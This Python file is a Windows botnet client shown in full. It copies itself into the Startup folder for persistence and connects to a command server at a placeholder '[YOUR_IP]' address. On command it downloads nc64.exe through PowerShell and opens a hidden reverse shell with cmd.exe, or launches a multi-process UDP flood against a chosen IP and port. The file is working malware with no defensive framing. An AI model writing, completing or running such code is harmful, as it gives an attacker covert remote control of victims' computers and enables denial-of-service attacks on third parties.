import socket
import threading
import time
import os
import sys
import shutil
import random
import multiprocessing
import subprocess
import tempfile


should_reconnect = True

def copy_to_startup_directory():
    try:
        # Get the current script's path
        script_path = os.path.abspath(sys.argv[0])

        # Determine the Startup directory for Windows
        startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        # Copy the script to the Startup directory
        shutil.copy(script_path, os.path.join(startup_dir, os.path.basename(script_path)))

        print("Script copied to the Startup directory successfully.")
    except Exception as e:
        print(f"Error copying script to Startup directory: {e}")

    start_client()

def receive_messages(client_socket):
    global should_reconnect
    while should_reconnect:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break

            print(f"Received from server: {data}")

            # Check for disconnect messages
            if data == 'disconnect':
                print("Server has requested disconnect. Closing client...")
                should_reconnect = False  # Set the flag to False to prevent reconnection
                break
            elif data == 'disconnect_all':
                print("Server has requested all clients to disconnect. Closing client...")
                should_reconnect = True  # Set the flag to False to prevent reconnection
                break

            # Perform any action based on the received message
            if data == 'shell':
                download_and_run_nc()

            if data.startswith('attack'):
                # Extract IP, threads, and timer from the received data
                _, ip, threads, timer, port = data.split()
                thread_attack(ip, int(threads), int(timer), int(port))

        except Exception as e:
            print(f"Error in receive_messages: {e}")

    print("Server connection closed.")
    client_socket.close()

    # Add a delay before attempting to reconnect
    time.sleep(60)

def download_and_run_nc():
    try:
        # Get the temporary folder path
        temp_folder = tempfile.gettempdir()
        # Full path to the downloaded 'nc64.exe' file in the temporary folder
        nc_path = os.path.join(temp_folder, 'nc64.exe')
        # PowerShell command to download 'nc64.exe' to the temporary folder
        powershell_command = f'Invoke-WebRequest -Uri "http://[YOUR_IP]/nc64.exe" -OutFile "{nc_path}"'
        # Run the PowerShell command
        subprocess.Popen(['powershell', '-command', powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)
        # Wait for a moment to ensure the download completes
        subprocess.Popen(['timeout', '/nobreak', '5'], shell=True).wait()
        # Run 'nc64.exe' from the temporary folder
        subprocess.Popen([os.path.join(temp_folder, 'nc64.exe'), '[YOUR_IP]', '4444', '-e', 'cmd.exe'], creationflags=subprocess.CREATE_NO_WINDOW)

    except Exception as e:
        print(f"Failed to start shell: {e}")

def start_client():
    host = '[YOUR_IP]'
    port = 443

    while should_reconnect:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            print(f"Connected to {host}:{port}")

            # Start a thread to receive messages from the server
            receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
            receive_thread.start()

            receive_thread.join()  # Wait for the receive thread to finish

        except ConnectionRefusedError:
            print("Connection refused. Retrying in 5 seconds...")
            time.sleep(5)

def attack_worker(ip, timer, port):
    start_time = time.time()
    timeout = start_time + timer

    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        packets_sent = 0
        while time.time() < timeout:
            dport = port
            sock.sendto(Bytes * random.randint(2, 55), (ip, dport))
            packets_sent += 1

        end_time = time.time()
        elapsed_time = end_time - start_time
        packets_per_second = packets_sent / elapsed_time

        print(f"Attack completed. Sent {packets_sent} packets in {elapsed_time:.2f} seconds.")
        print(f"Average packets per second: {packets_per_second:.2f}")

    except Exception as Error:
        print(f"Error during attack: {Error}")

def thread_attack(ip, threads, timer, port):
    # Create a list to store the worker processes
    processes = []

    # Start processes for the attack
    for _ in range(0, threads):
        process = multiprocessing.Process(target=attack_worker, args=(ip, timer, port))
        process.start()
        processes.append(process)

    # Wait for all processes to finish or until the timeout is reached
    for process in processes:
        process.join()

    print("All attack processes completed.")

if __name__ == "__main__":
    copy_to_startup_directory()
